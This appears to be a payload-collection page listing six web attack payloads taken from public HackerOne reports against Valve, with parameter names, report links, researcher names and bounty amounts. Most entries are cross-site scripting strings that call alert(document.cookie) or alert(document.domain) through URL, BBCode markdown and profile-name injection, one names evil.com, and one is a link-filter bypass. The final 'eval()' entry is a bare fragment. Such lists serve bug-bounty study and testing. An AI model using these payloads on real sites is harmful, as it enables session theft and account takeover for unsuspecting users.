# Valve

6 payloads.

### `f63ebf80`

```
https://target.com/linkfilter/?url=pornhub%E3%80%82com
```

**Parameter:** `url`
— [Link filter protection bypass](https://hackerone.com/reports/291750) · Valve · [ramsexy](https://hackerone.com/ramsexy)

### `3c2b7ea7`

```
target.com/international/live/5/5/1})}});alert(document.cookie);(test=>{{({<!--
```

**Parameter:** `url`
— [Reflected XSS in target.com](https://hackerone.com/reports/292457) · Valve · [jr0ch17](https://hackerone.com/jr0ch17)

### `a5296279`

```
[url=target.com:/onclick='alert(document.domain)'[url=]]xss[/url]
```

**Parameter:** `t`
— [Xss was found by exploiting the URL markdown on http://target.com](https://hackerone.com/reports/313250) · Valve · [kenziy](https://hackerone.com/kenziy) · $1,000.0

### `cdf30d3f`

```
http://target.com/widget/386360/?t=[url=evil.com:/onclick=%27alert(document.domain
```

**Parameter:** `t`
— [Xss was found by exploiting the URL markdown on http://target.com](https://hackerone.com/reports/313250) · Valve · [kenziy](https://hackerone.com/kenziy) · $1,000.0

### `1ad3f2ea`

```
<a href="#" onclick="AddFriend(false,'PROFILE_NUMBER','NAME'); alert(document.cookie+''); $J(this).hide(); return false;" class="btnv6_blue_hoverfade btn_small btn_uppercase" style="display: none;">
    <span>Add as friend</span>
</a>
```

— [Stored XXS @ https://target.com/search/users/#text= via Profile Name](https://hackerone.com/reports/351171) · Valve · [osintopsec](https://hackerone.com/osintopsec) · $750.0

### `4b54097e`

```
eval()
```

— [Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message](https://hackerone.com/reports/631956) · Valve · [shayhelman](https://hackerone.com/shayhelman)
